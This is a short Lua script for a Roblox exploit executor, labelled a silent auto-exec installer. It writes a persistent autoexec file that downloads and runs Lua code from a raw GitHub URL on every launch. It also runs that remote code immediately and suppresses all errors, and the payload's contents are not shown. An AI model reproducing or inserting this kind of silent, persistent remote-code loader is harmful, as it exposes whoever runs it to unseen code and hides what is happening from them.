-- Silent AutoExec Installer + Immediate Run
local LOADER_URL = "https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/Original.lua"
local AUTOEXEC_FILE = "autoexec/autoexe.lua"

local function installLoader()
    if writefile and isfolder("autoexec") then
        pcall(function()
            writefile(AUTOEXEC_FILE, string.format('loadstring(game:HttpGet("%s"))()', LOADER_URL))
        end)
    end
end

local function runLoader()
    pcall(function()
        loadstring(game:HttpGet(LOADER_URL))()
    end)
end

pcall(installLoader)
pcall(runLoader)
